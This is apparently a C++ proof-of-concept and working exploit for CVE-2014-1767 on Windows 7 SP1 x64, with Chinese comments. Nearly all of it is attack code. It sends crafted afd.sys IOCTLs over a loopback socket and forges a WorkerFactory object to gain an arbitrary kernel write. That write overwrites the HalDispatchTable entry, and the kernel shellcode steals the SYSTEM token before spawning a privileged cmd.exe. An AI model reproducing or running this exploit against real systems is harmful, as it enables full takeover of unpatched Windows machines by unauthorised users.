// CVE-2014-1767_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
//平台：windows7_sp1_x64 平台
//罗霄编写POC 和  EXP 
//2021年12月5号

#include "CVE-2014-1767_x64.h"


pNtCreateWorkerFactory           fpCreateWorkerFactory = NULL;
pNtSetInformationWorkerFactory   fpSetInformationWorkerFactory = NULL;

PNtQuerySystemInformation        fpQuerySystemInformation = NULL;
PVOID						     kHalDsipatchTable = NULL;
PPsLookupProcessByProcessId      kfpLookupProcessById = NULL;
PNtQueryIntervalProfile          fpQueryIntervalProfile = NULL;

PNtQueryEaFile                   fpQueryEaFile = NULL;
HANDLE hWorkerFactory = NULL;
PVOID                            kfpHaliQuerySystemInformation = NULL;
pNtQueryInformationWorkerFactory fpQueryInformationWorkerFactory = NULL ;

ULONG dwCurProcessId = 0;
ULONG dwSystemProcessId = 0;

pNtZwAllocateVirtualMemory       fpZwAllocateVirtualMemory = NULL;

ULONG CalcLength()
{
	int BaseLength = 0x10000;
	unsigned __int16 VirtualAddress = 0x13371337;
	int FinalLength = 0x0;
	while (1)
	{
		FinalLength = ((BaseLength & 0xFFF) + ((unsigned __int16)VirtualAddress & 0xFFF) + 0xFFF) >> 0xC;
		FinalLength = 8 * (FinalLength + (BaseLength>>0xC))+ 0x30;
			if (FinalLength == 0x100)
			{
				break;
			}
			else
			{
				BaseLength += 1;
				continue;
			}
	}
	
	return BaseLength;

}

HMODULE GetKrnlNtBase(char* szNtName)
{

	RTL_PROCESS_MODULES  SysModuleInformation;
	DWORD dwRetLength;

	//故意写成0x1让其错误，以得到dwRetLength
	BOOL status = fpQuerySystemInformation(SystemModuleInformation, &SysModuleInformation, 0x1, &dwRetLength);
	if (status != 0xC0000004)
	{
		printf("fpQuerySystemInformation FAILED ,%x\n",status);
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, dwRetLength);

	if (0 != fpQuerySystemInformation(SystemModuleInformation, pBuf, dwRetLength, &dwRetLength))
	{
		printf("fpQuerySystemInformation FAILED 2\n");
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Modules;
	HMODULE hModuleBase = NULL;

	//EnumDeviceDrivers (python里面用的这个函数)

	for (ULONG i = 0; i < pBuf->NumberOfModules; i++)
	{
		if (!hModuleBase && strstr((char *)pModEntry->FullPathName, "nt") && strstr((char *)pModEntry->FullPathName, "exe"))
		{
			strcpy_s(szNtName, MAX_PATH, (char*)((ULONG_PTR)pModEntry->FullPathName + pModEntry->OffsetToFileName));
			hModuleBase = (HMODULE)(pModEntry->ImageBase);
			break;
		}
		pModEntry++;
	}

	if (hModuleBase == NULL)
	{
		printf("FAIL : Get Ntoskrnl Base\n");
		ExitProcess(0);
	}

	LocalFree(pBuf);
	return hModuleBase;
	

}

VOID InitExpVars()
{
    HMODULE hNtdll;
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll==NULL)
    {
        printf("FAIL : hNtdll == NULL! \n");
        ExitProcess(0);
    }
	
    fpCreateWorkerFactory = (pNtCreateWorkerFactory)GetProcAddress(hNtdll, "ZwCreateWorkerFactory");
    fpSetInformationWorkerFactory = (pNtSetInformationWorkerFactory)GetProcAddress(hNtdll, "ZwSetInformationWorkerFactory");
	fpQueryInformationWorkerFactory = (pNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "ZwQueryInformationWorkerFactory");
	fpQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	fpQueryEaFile = (PNtQueryEaFile)GetProcAddress(hNtdll, "ZwQueryEaFile");
	fpQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, "ZwQueryIntervalProfile");

	//这儿只是为了实验，并不是用到了
	PVOID hand = 0;
	SIZE_T RegionSize = 8192;
	//PVOID *AllocateAddress = (PVOID *)0x1000;//不能在0x1000分配空间
	PVOID addr = (PVOID)0;
	fpZwAllocateVirtualMemory = (pNtZwAllocateVirtualMemory)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
	int dwStatus = fpZwAllocateVirtualMemory(HANDLE(-1),&hand, 0x0, &RegionSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, 0x40);
	

    if (!fpCreateWorkerFactory ||
        !fpSetInformationWorkerFactory ||
        !fpQueryInformationWorkerFactory ||
		!fpQuerySystemInformation)
    {
		printf("FAIL : GetProcAddress Kernel Function Address FAIL \n");
		ExitProcess(0);
    }
    
	char NtKernelName[MAX_PATH];

	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName);
	HMODULE hUserNtBase = LoadLibraryA(NtKernelName);
	
	kHalDsipatchTable = (PVOID)((ULONG_PTR)GetProcAddress(hUserNtBase,"HalDispatchTable") -\
												(ULONG_PTR)hUserNtBase + \
												 (ULONG_PTR)hKrnlNtBase);
	if ((ULONG_PTR)kHalDsipatchTable == (ULONG_PTR)hKrnlNtBase - (ULONG_PTR)hUserNtBase)
	{
		printf("GetProcAddress kHalDsipatchTable FAIL !\n");
		ExitProcess(0);
	}

	kfpLookupProcessById = (PPsLookupProcessByProcessId)((ULONG_PTR)GetProcAddress(hUserNtBase, \
		"PsLookupProcessByProcessId") - \
		(ULONG_PTR)hUserNtBase + \
		(ULONG_PTR)hKrnlNtBase);
	if ((ULONG_PTR)kfpLookupProcessById == (ULONG_PTR)hKrnlNtBase - (ULONG_PTR)hUserNtBase)
	{
		printf("GetProcAddress kfpLookupProcessById FAIL !\n");
		ExitProcess(0);
	}

	printf("fpQueryIntervalProfile: %p\n", fpQueryIntervalProfile);
	printf("kfpLookupProcessById: %p\n", kfpLookupProcessById);
	printf("fpCreateWorkerFactory: %p\n", fpCreateWorkerFactory);
	printf("fpSetInformationWorkerFactory: %p\n", fpSetInformationWorkerFactory);
	printf("fpQuerySystemInformation: %p\n", fpQuerySystemInformation);
	printf("kHalDsipatchTable: %p\n", kHalDsipatchTable);
	printf("fpQueryEaFile: %p\n", fpQueryEaFile);
	printf("fpQueryInformationWorkerFactory: %p\n", fpQueryInformationWorkerFactory);
	printf("ShellCode: %p\n", ShellCode);

	dwCurProcessId = GetCurrentProcessId();
	dwSystemProcessId = 4;


    return;
}


void ShellCode()
{
#if 1
	//Windows 7 Kernel Version 7601 (Service Pack 1) MP(1 procs) Free x64
	//	Product : WinNt, suite : TerminalServer SingleUserTS
	//	Built by : 7601.24384.amd64fre.win7sp1_ldr_escrow.190220 - 1800
	//ULONG dwTokenOffset = 0xF8; // Windows 7,6.1 X86
	ULONG dwTokenOffset = 0x208; // Windows 7,7601,sp1 x64

	PEPROCESS pCur, pSys;
	kfpLookupProcessById((HANDLE)dwCurProcessId, &pCur);
	kfpLookupProcessById((HANDLE)dwSystemProcessId, &pSys);

	// Change to system token
	*(PVOID*)((ULONG_PTR)pCur + dwTokenOffset) = *(PVOID*)((ULONG_PTR)pSys + dwTokenOffset);

	// Disable our handle's handle-table-entry to avoid BSOD
	PBYTE ObjectTable = *(PBYTE*)((ULONG_PTR)pCur + 0x200);//   +0x200 ObjectTable      : Ptr64 _HANDLE_TABLE
	PBYTE HandleTableEntry = (PBYTE)((*(ULONG_PTR*)(ObjectTable)) & 0xFFFFFFFFFFFFFFFC)+8 *(((ULONG_PTR)hWorkerFactory)>>2);
	*(PVOID*)HandleTableEntry = NULL;
	*(ULONG*)(ObjectTable + 0x58) -= 1;  //HandleCount
#endif
	// Reset dispatch table hook
	*(PVOID*)((ULONG_PTR)kHalDsipatchTable + sizeof(PVOID)) = kfpHaliQuerySystemInformation;

	return ;
}


int main()
{
	int nBottonRect = 0x2aaaaaa;
	while (true)
	{
		HRGN hrgn = CreateRoundRectRgn(0, 0, 1, nBottonRect, 1, 1);
		if (hrgn==NULL)
		{
			break;
		}
		printf("hrgn = %p\n", hrgn);
	}


    InitExpVars();
	// 0x100 == WorkFactory Allocated Object Size
	const DWORD FakeObjSize = 0x100;
	//HANDLE hWorkerFactory = NULL;
    DWORD mdlSize = FakeObjSize;

    DWORD length = CalcLength();
	printf("Length = %x\n", length);
	DWORD virtualAddress = 0x13371337;
	
    static BYTE inbuf1[0x40];
	memset(inbuf1, 0, sizeof(inbuf1));
	*(ULONG_PTR*)(inbuf1 + 0x20) = virtualAddress; 
	*(ULONG*)(inbuf1 + 0x28) = length;          



	static BYTE inbuf2[0x18];
	memset(inbuf2, 0, sizeof(inbuf2));
	*(ULONG*)(inbuf2) = 1; 
	*(ULONG*)(inbuf2 + 0x8) = 0x0AAAAAAA;         

	WSADATA		 WSAData;
	SOCKET		 s;
	sockaddr_in  sa;
	int			 ierr;

	WSAStartup(0x2, &WSAData);
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;

	ierr = connect(s, (const struct sockaddr*)&sa, sizeof(sa));
	

	DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x40, NULL, 0, NULL, NULL);

    HANDLE hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 4);
	LONG ntStatus = fpCreateWorkerFactory(&hWorkerFactory,
		GENERIC_ALL,
		NULL,
		hCompletionPort,
		(HANDLE)-1,
		NULL,
		NULL,
		0,
		0,
		0);
	printf("hWorkerFactory: %p\n", hWorkerFactory);
	

	DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, NULL, 0, NULL, NULL);
	
	IO_STATUS_BLOCK IoStatus;
	static BYTE FakeWorkerFactory[FakeObjSize];
	memset(FakeWorkerFactory, 0, FakeObjSize);
	
	static BYTE ObjHead[0x50] =
	{
		0x00,0x00,0x00,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x16,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	};

	memcpy(FakeWorkerFactory, ObjHead, 0x50);

	static BYTE a[0x18+0x4+0x4] =
	{
		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, //18个
		0x00,0x00,0x00,0x00,   //*(_QWORD *)Object + 0x18
		0x00,0x00,0x00,0x00    
	};


	PVOID *pFakeObj = (PVOID*)((ULONG_PTR)FakeWorkerFactory + 0x50); 
	*pFakeObj = a;
	printf("object a : = %p\n", a);
	printf("pFakeObj = %p\n", pFakeObj);
	
	ULONG_PTR kHalDsipatchTableQueryAddr =(ULONG_PTR)kHalDsipatchTable + sizeof(PVOID); 
	

	static ULONG_PTR ShotAddress = (ULONG_PTR)ShellCode;  
	printf("%p\n", ShellCode);
	
	
	*(ULONG_PTR*)(pFakeObj + 0x10) = (ULONG_PTR)kHalDsipatchTable + sizeof(PVOID) - 0x180 ;


	fpQueryEaFile(INVALID_HANDLE_VALUE, &IoStatus, NULL, 0, FALSE, FakeWorkerFactory, FakeObjSize , NULL, FALSE);


	static BYTE kernelRetMem[0x78];
	memset(kernelRetMem, 0, sizeof(kernelRetMem));

	fpQueryInformationWorkerFactory(hWorkerFactory,
		WorkerFactoryBasicInformation,
		kernelRetMem,
		0x78,
		NULL);

	kfpHaliQuerySystemInformation = *(PVOID*)(kernelRetMem + 8 * 0xB); //kernelRetMem是byte，所以*8
	printf("kfpHaliQuerySystemInformation: %p\n", kfpHaliQuerySystemInformation);

	DWORD what_write2 = ShotAddress >> 32 & 0xffffffff;   //F1F2F3F4--------00000001
	DWORD what_write1 = ShotAddress & 0xffffffff;		  //12345678--------3FA256C0


	printf("1\n");

	*(PVOID*)(a + 0x18) = (PVOID)(kHalDsipatchTableQueryAddr - 0x2C); 
	fpSetInformationWorkerFactory(hWorkerFactory, WorkerFactoryAdjustThreadGoal, &what_write1, 0x4);


	*(PVOID*)(a + 0x18) = (PVOID)(kHalDsipatchTableQueryAddr - 0x2C + 0x04); 
	fpSetInformationWorkerFactory(hWorkerFactory, WorkerFactoryAdjustThreadGoal, &what_write2, 0x4);
	printf("end\n");


	ULONG Interval;
	fpQueryIntervalProfile(2,&Interval);

	ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);

	while (true)
	{

	}


    return 0;
    
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
